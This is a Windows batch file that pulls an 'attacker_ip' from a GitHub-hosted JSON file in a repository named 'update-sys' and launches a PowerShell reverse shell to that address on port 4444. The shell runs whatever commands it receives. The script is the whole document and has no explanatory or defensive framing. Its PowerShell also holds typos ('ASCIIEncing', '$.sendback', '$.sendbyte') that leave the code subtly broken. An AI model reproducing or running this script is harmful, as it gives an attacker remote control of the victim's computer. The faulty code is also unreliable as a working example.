@echo off
for /f "tokens=2 delims=:," %%a in ('curl -s https://raw.githubusercontent.com/kevinhamza/update-sys/main/ip.json ^| findstr attacker_ip') do set IP=%%a
set IP=%IP:"=%
start cmd.exe /k powershell -c "$client = New-Object System.Net.Sockets.TCPClient('%IP%',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncing).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$.sendback2 = $.sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($.sendback);$stream.Write($.sendbyte,0,$.sendbyte.Length);$stream.Flush()};$client.Close()"
